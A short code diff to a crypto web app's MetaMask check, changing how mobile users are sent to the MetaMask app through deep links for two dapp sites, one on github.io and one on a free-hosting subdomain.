@@ -57,7 +57,8 @@
             try {
                 if (typeof window.ethereum === 'undefined' || !window.ethereum.isMetaMask) {
                     if (isMobile()) {
-                        window.open("https://metamask.app.link/dapp/altctrldelcode.github.io/megabuckslive//");
+                        // Redirect to MetaMask mobile app
+                        window.location.href = 'https://metamask.app.link/dapp/altctrldelcode.github.io/megabuckslive/';
                     } else {
                         alert('MetaMask is not detected. Please install MetaMask!');
                     }
@@ -115,7 +116,8 @@
                 console.log('MetaMask is installed!');
             } else {
                 if (isMobile()) {
-                    window.open("https://metamask.app.link/dapp/clubmega-auth.000webhostapp.com/");
+                    // Redirect to MetaMask mobile app
+                    window.location.href = 'https://metamask.app.link/dapp/clubmega-auth.000webhostapp.com/';
                 } else {
                     alert('MetaMask is not detected. Please install MetaMask!');
                 }
